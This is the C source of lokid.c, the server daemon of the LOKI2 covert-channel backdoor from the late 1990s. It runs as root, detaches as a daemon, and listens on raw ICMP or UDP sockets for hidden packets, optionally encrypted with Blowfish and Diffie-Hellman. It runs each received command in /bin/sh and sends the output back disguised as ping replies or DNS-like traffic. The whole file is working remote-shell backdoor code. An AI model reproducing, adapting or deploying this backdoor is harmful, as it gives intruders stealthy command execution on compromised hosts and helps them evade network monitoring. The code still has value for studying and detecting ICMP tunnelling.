/*
 * LOKI2
 *
 * [ lokid.c ]
 *
 *  1996/7 Guild Corporation Worldwide      [daemon9] 
 */


#include "loki.h"
#include "client_db.h"
#include "shm.h"

jmp_buf env;                            /* holds our stack frame    */
struct loki sdg, rdg;                   /* LOKI packets             */
time_t uptime   = 0;                    /* server uptime            */
u_long b_sent   = 0, p_sent = 0;        /* bytes / packets written  */ 
u_short c_id    = 0;                    /* client id                */
int destroy_shm = NOK;                  /* Used to mark whether or not
                                         * a process should destroy the
                                         * shm segment upon exiting.
                                         */
int verbose     = OK, prot = IPPROTO_ICMP, ripsock = 0, tsock = 0; 

#ifdef  STRONG_CRYPTO
extern u_char user_key[BF_KEYSIZE];
extern BF_KEY bf_key;
extern u_short ivec_salt;               
DH *dh_keypair = NULL;                  /* DH public and private key */
#endif

#ifdef PTY
int mfd = 0;                            /* master PTY file descriptor */
#endif

int main(int argc, char *argv[])
{

    static int one       = 1, c = 0, cflags = 0;
    u_char buf1[BUFSIZE] = {0};
    pid_t pid            = 0;
#ifdef  STRONG_CRYPTO
    static int c_ind     = -1;
#endif
#ifdef  POPEN
    FILE *job            = NULL;
    char buf2[BUFSIZE]   = {0};
#endif
                                        /* ensure we have proper permissions */
    if (geteuid() || getuid()) err_exit(0, 1, 1, L_MSG_NOPRIV);
    while ((c = getopt(argc, argv, "v:p:")) != EOF)
    {
        switch (c)
        {
            case 'v':                   /* change verbosity */
                verbose = atoi(optarg);
                break;

            case 'p':                   /* choose transport protocol */
                switch (optarg[0])
                {
                    case 'i':           /* ICMP_ECHO / ICMP_ECHOREPLY */
                        prot = IPPROTO_ICMP;
                        break;

                    case 'u':           /* DNS query / reply */
                        prot = IPPROTO_UDP;
                        break;

                    default:
                        err_exit(1, 0, 1, "Unknown transport\n");
                }
                break;

            default:
                err_exit(0, 0, 1, S_MSG_USAGE);
        }
    }                               
    if ((tsock = socket(AF_INET, SOCK_RAW, prot)) < 0)
        err_exit(1, 1, 1, L_MSG_SOCKET);
#ifdef  STRONG_CRYPTO                   /* ICMP only with strong crypto */
    if (prot != IPPROTO_ICMP) err_exit(0, 0, 1, L_MSG_ICMPONLY);
#else
                                        /* Child will signal parent if a 
                                         * transport protcol switch is 
                                         * required 
                                         */
    if (signal(SIGUSR1, swap_t) == SIG_ERR) 
        err_exit(1, 1, verbose, L_MSG_SIGUSR1);
#endif

    if ((ripsock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0)
         err_exit(1, 1, 1, L_MSG_SOCKET);
#ifdef  DEBUG
    fprintf(stderr, "\nRaw IP socket: ");
    fd_status(ripsock, OK);
#endif

#ifdef  IP_HDRINCL
    if (setsockopt(ripsock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0)
        if (verbose) perror("Cannot set IP_HDRINCL socket option");
#endif
                                        /* power up shared memory segment and
                                         * semaphore, register dump_shm to be 
                                         * called upon exit
                                         */
    prep_shm();
    if (atexit(dump_shm) == -1) err_exit(1, 1, verbose, L_MSG_ATEXIT);

    fprintf(stderr, L_MSG_BANNER);
    time(&uptime);                      /* server uptime timer */

#ifdef  STRONG_CRYPTO
                                        /* Generate DH parameters */
    if (verbose) fprintf(stderr, "\nlokid: %s", L_MSG_DHKEYGEN); 
    if (!(dh_keypair = generate_dh_keypair())) 
        err_exit(1, 0, verbose, L_MSG_DHKGFAIL);
    if (verbose) fprintf(stderr, "\nlokid: done.\n"); 
#endif 
#ifndef DEBUG
    shadow();                       /* go daemon */
#endif
    destroy_shm = OK;               /* if this process exits at any point
                                     * from hereafter, mark shm as destroyed
                                     */
                                    /* Every KEY_TIMER seconds, we should
                                     * check the client_key list and see
                                     * if any entries have been idle long
                                     * enough to expire them.
                                     */
    if (signal(SIGALRM, client_expiry_check) == SIG_ERR)
        err_exit(1, 1, verbose, L_MSG_SIGALRM);
    alarm(KEY_TIMER);

    if (signal(SIGCHLD, reaper) == SIG_ERR)
        err_exit(1, 1, verbose, L_MSG_SIGCHLD);

    for (; ;)
    {
        cflags &= ~VALIDP;              /* Blocking read */
        c = read(tsock, (struct loki *)&rdg, LOKIP_SIZE);

        switch (prot)
        {                               /* Is this a valid Loki packet? */
            case IPPROTO_ICMP:
                if ((IS_GOOD_ITYPE_D(rdg)))
                { 
                    cflags |= VALIDP;
                    c_id   = rdg.ttype.icmph.icmp_id;
                }
                break;

            case IPPROTO_UDP:
                if ((IS_GOOD_UTYPE_D(rdg)))
                { 
                    cflags |= VALIDP;
                    c_id   = rdg.ttype.udph.uh_sport;
                }
                break;

            default:
                err_exit(1, 0, verbose, L_MSG_WIERDERR);
        }
        if (cflags & VALIDP)
        {
#ifdef  DEBUG
        fprintf(stderr, "\n[DEBUG]\tlokid: read %d bytes, packet type: ", c);
        PACKET_TYPE(rdg);
        DUMP_PACKET(rdg, c);
#endif
	    switch (pid = fork())
            {                           
	        case 0:                 
                    destroy_shm = NOK;  /* child should NOT mark segment as
                                         * destroyed when exiting...
                                         */
                                        /* TLI seems to have  problems in 
                                         * passing socket file desciptors around
                                         */
#ifdef  SOLARIS                         
                    close(ripsock);
                    if ((ripsock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0)
                        err_exit(1, 1, 1, L_MSG_SOCKET);
#ifdef  DEBUG
                    fprintf(stderr, "\nRaw IP socket: ");
                    fd_status(ripsock, OK);
#endif  /* DEBUG */
#endif  /* SOLARIS */
    		    break;

                default:                /* parent will loop forever spawning 
                                         * children if we do not zero rdg
                                         */
                    bzero((struct loki *)&rdg, LOKIP_SIZE);
                    cflags &= ~VALIDP;
		    continue;

	        case -1:            /* fork error */
		    err_exit(1, 1, verbose, "[fatal] forking error");
            }
#ifdef  STRONG_CRYPTO
                                        /* preliminary evaluation of the pkt
                                         * to see if we have a request for the
                                         * servers public key
                                         */
            if (rdg.payload[0] == L_PK_REQ)
            {
                if (verbose)
                {
                    fprintf(stderr, "\nlokid: public key submission and request : %s <%d> ", host_lookup(rdg.iph.ip_dst), c_id);
                    fprintf(stderr, "\nlokid: computing shared secret");
                }
                DH_compute_key(buf1, (void *)BN_bin2bn(&rdg.payload[1], BN2BIN_SIZE, NULL), dh_keypair);
                if (verbose) fprintf(stderr, "\nlokid: extracting 128-bit blowfish key");
                                        /* Try to add client to client list */
                if (((c = add_client(extract_bf_key(buf1, NOK))) == -1))
                {
#else
                if (((c = add_client((u_char *)NULL)) == -1))
                {
#endif                                  /* MAX_CLIENT limit reached */
                    lokid_xmit(S_MSG_PACKED, LP_DST, L_ERR, NOCR);
                    lokid_xmit(buf1, LP_DST, L_EOT, NOCR);
                    err_exit(1, 0, verbose, "\nlokid: Cannot add key\n");
                }

#ifdef  STRONG_CRYPTO
                if (verbose)
                { 
                    fprintf(stderr, "\nlokid: client <%d> added to list [%d]", c_id, c);
                    fprintf(stderr, "\nlokid: submiting my public key to client");
                }                       /* send our public key to the client */
                bzero((u_char *)buf1, BUFSIZE);
                BN_bn2bin((BIGNUM *)dh_keypair -> pub_key, buf1);   

                lokid_xmit(buf1, LP_DST, L_PK_REPLY, NOCR);
                lokid_xmit(buf1, LP_DST, L_EOT, NOCR);
                clean_exit(0);
            }
            bzero((u_char *)buf1, BUFSIZE);
                                        /* Control falls here when we have
                                         * a regular request packet.
                                         */
            if ((c_ind = locate_client(FIND)) == -1)
            {                           /* Cannot locate the client's entry */
                lokid_xmit(S_MSG_UNKNOWN, LP_DST, L_ERR, NOCR);
                lokid_xmit(buf1, LP_DST, L_EOT, NOCR);
                err_exit(1, 0, verbose, S_MSG_UNKNOWN);
            }                           /* set expanded blowfish key */
            else BF_set_key(&bf_key, BF_KEYSIZE, user_key);
#endif
                                        /* unload payload */
   	    bcopy(&rdg.payload[1], buf1, BUFSIZE - 1);
#ifdef  STRONG_CRYPTO
                                        /* The IV salt is incremented in the
                                         * client prior to encryption, ergo
                                         * the server should increment before 
                                         * decrypting
                                         */
            ivec_salt = update_client_salt(c_ind);
#endif
            blur(DECR, BUFSIZE - 1, buf1);
                                        /* parse escaped command */
            if (buf1[0] == '/') d_parse(buf1, pid, ripsock);
#ifdef  POPEN                           /* popen the shell command and execute
                                         * it inside of /bin/sh
                                         */ 
            if (!(job = popen(buf1, "r")))
                err_exit(1, 1, verbose, "\nlokid: popen");

            while (fgets(buf2, BUFSIZE - 1, job))
            {
                bcopy(buf2, buf1, BUFSIZE);
                lokid_xmit(buf1, LP_DST, L_REPLY, OKCR);
            }
            lokid_xmit(buf1, LP_DST, L_EOT, OKCR);
#ifdef  STRONG_CRYPTO
            update_client(c_ind, p_sent, b_sent);
#else
            update_client(locate_client(FIND), p_sent, b_sent);
#endif
            clean_exit(0);              /* exit the child after sending
                                         * the last packet 
                                         */
#endif
#ifdef  PTY                             /* Not implemented yet */
            fprintf(stderr, "\nmfd: %d", mfd);
#endif
        }
    }
}


/*
 *  Build and transmit Loki packets (server-side version)
 */

int lokid_xmit(u_char *payload, u_long dst, int ptype, int crypt_flag)
{
    struct sockaddr_in sin;
    int i               = 0; 

    bzero((struct loki *)&sdg, LOKIP_SIZE);

    sin.sin_family      = AF_INET;
    sin.sin_addr.s_addr = dst;
    sdg.payload[0]      = ptype;        /* set packet type */
                                        /* Do not encrypt error or public
                                         * key reply packets
                                         */       
    if (crypt_flag == OKCR) blur(ENCR, BUFSIZE - 1, payload);	
    bcopy(payload, &sdg.payload[1], BUFSIZE - 1);

    if (prot == IPPROTO_ICMP)
    {
#ifdef  NET3                                            /* Our workaround. */
        sdg.ttype.icmph.icmp_type   = ICMP_ECHO;
#else
        sdg.ttype.icmph.icmp_type   = ICMP_ECHOREPLY;
#endif
        sdg.ttype.icmph.icmp_code   = (int)NULL;
        sdg.ttype.icmph.icmp_id     = c_id;             /* client ID */
        sdg.ttype.icmph.icmp_seq    = L_TAG;            /* Loki ID */
        sdg.ttype.icmph.icmp_cksum  =
             i_check((u_short *)&sdg.ttype.icmph, BUFSIZE + ICMPH_SIZE);
    }
    if (prot == IPPROTO_UDP)
    {
        sdg.ttype.udph.uh_sport     = NL_PORT;
        sdg.ttype.udph.uh_dport     = rdg.ttype.udph.uh_sport;
        sdg.ttype.udph.uh_ulen      = htons(UDPH_SIZE + BUFSIZE);
        sdg.ttype.udph.uh_sum       =
             i_check((u_short *)&sdg.ttype.udph, BUFSIZE + UDPH_SIZE);
    }
    sdg.iph.ip_v    = 0x4;
    sdg.iph.ip_hl   = 0x5;
    sdg.iph.ip_len  = FIX_LEN(LOKIP_SIZE);
    sdg.iph.ip_ttl  = 0x40;
    sdg.iph.ip_p    = prot;
    sdg.iph.ip_dst  = sin.sin_addr.s_addr;
 
#ifdef  SEND_PAUSE
    usleep(SEND_PAUSE);
#endif
    if ((i = sendto(ripsock, (struct loki *)&sdg, LOKIP_SIZE, (int)NULL, (struct sockaddr *)&sin, sizeof(sin))) < LOKIP_SIZE)
    {
        if (verbose) perror("[non fatal] truncated write");
    }
    else
    {                               /* Update global stats */
        b_sent += i; 
        p_sent ++;
    }
    return ((i < 0 ? 0 : i));     /* Make snocrash happy (return bytes written,
                                   * or return 0 if there was an error) 
                                   */
}


/*
 *  Parse escaped commands (server-side version)
 */

void d_parse(u_char *buf, pid_t pid, int ripsock)
{
    u_char buf2[4 * BUFSIZE]    = {0};
    int n                       = 0, m = 0;
    u_long client_ip            = 0;
                                        /* client request for an all kill */
    if (!strncmp(buf, QUIT_ALL, sizeof(QUIT_ALL) - 1))
    {
        if (verbose) fprintf(stderr, "\nlokid: client <%d> requested an all kill\n", c_id);
        while (n < MAX_CLIENT)          /* send notification to all clients */
        {
            if ((client_ip = check_client_ip(n++, &c_id)))
            {
                if (verbose) fprintf(stderr, "\tsending L_QUIT: <%d> %s\n", c_id, host_lookup(client_ip));
                lokid_xmit(buf, client_ip, L_QUIT, NOCR);
            }
        }
        if (verbose) fprintf(stderr, S_MSG_CLIENTK);
                                        /* send a SIGKILL to all the processes
                                         * in the servers group...
                                         */
        if ((kill(-pid, SIGKILL)) == -1)
            err_exit(1, 1, verbose, "[fatal] could not signal process group");
        clean_exit(0);
    }
                                        /* client is exited, remove entry
                                         * from the client list
                                         */
    if (!strncmp(buf, QUIT_C, sizeof(QUIT_C) - 1))
    {
        if ((m = locate_client(DESTROY)) == -1) 
            err_exit(1, 0, verbose, S_MSG_UNKNOWN);
        else if (verbose) fprintf(stderr, "\nlokid: client <%d> freed from list [%d]", c_id, m);
        clean_exit(0);
    }
                                        /* stat request */
    if (!strncmp(buf, STAT_C, sizeof(STAT_C) - 1))
    {
        bzero((u_char *)buf2, 4 * BUFSIZE);
                                        /* Ok.  This is an ugly hack to keep
                                         * packet counts in sync with the
                                         * stat request.  We know the amount
                                         * of packets we are going to send (and
                                         * therefore the byte count) in advance
                                         * so we can preload the values.
                                         */
        update_client(locate_client(FIND), 5, 5 * LOKIP_SIZE);
        n = stat_client(locate_client(FIND), buf2, prot, uptime);
                                        /* breakdown payload into BUFSIZE-1 
                                         * chunks, suitable for transmission
                                         */
        for (; m < n; m += (BUFSIZE - 1))
        {
            bcopy(&buf2[m], buf, BUFSIZE - 1);
            lokid_xmit(buf, LP_DST, L_REPLY, OKCR);
        }
        lokid_xmit(buf, LP_DST, L_EOT, OKCR);
        clean_exit(0);                  /* exit the child after sending
                                         * the last packet 
                                         */
    }
#ifndef     STRONG_CRYPTO               /* signal parent to change protocols */
    if (!strncmp(buf, SWAP_T, sizeof(SWAP_T) - 1))
    {
        if (kill(getppid(), SIGUSR1))
            err_exit(1, 1, verbose, "[fatal] could not signal parent");
        clean_exit(0);
    }
#endif
                                        /* unsupport/unrecognized command */
    lokid_xmit(S_MSG_UNSUP, LP_DST, L_REPLY, OKCR);
    lokid_xmit(buf2, LP_DST, L_EOT, OKCR);

    update_client(locate_client(FIND), p_sent, b_sent);
    clean_exit(0);
}


/* 
 *  Swap transport protocols.  This is called as a result of SIGUSR1 from
 *  a child server process.
 */


void swap_t(int signo)
{

    int n                   = 0;
    u_long client_ip        = 0;
    struct protoent *pprot  = 0;
    char buf[BUFSIZE]       = {0};
  
    if (verbose) fprintf(stderr, "\nlokid: client <%d> requested a protocol swap\n", c_id);

    while (n < MAX_CLIENT)
    {
        if ((client_ip = check_client_ip(n++, &c_id)))
        {
            fprintf(stderr, "\tsending protocol update: <%d> %s [%d]\n", c_id, host_lookup(client_ip), n);
            lokid_xmit(buf, client_ip, L_REPLY, OKCR);
            lokid_xmit(buf, client_ip, L_EOT, OKCR);
/*            update_client(locate_client(FIND), p_sent, b_sent);*/
        }
    }

    close(tsock);

    prot = (prot == IPPROTO_UDP) ? IPPROTO_ICMP : IPPROTO_UDP;
    if ((tsock = socket(AF_INET, SOCK_RAW, prot)) < 0)
        err_exit(1, 1, verbose, L_MSG_SOCKET);
    pprot = getprotobynumber(prot);  
    sprintf(buf, "lokid: transport protocol changed to %s\n", pprot -> p_name);
    fprintf(stderr, "\n%s", buf);

    lokid_xmit(buf, LP_DST, L_REPLY, OKCR);
    lokid_xmit(buf, LP_DST, L_EOT, OKCR);
    update_client(locate_client(FIND), p_sent, b_sent);
                                            /* re-establish signal handler */
    if (signal(SIGUSR1, swap_t) == SIG_ERR)
        err_exit(1, 1, verbose, L_MSG_SIGUSR1);
}

/* EOF */
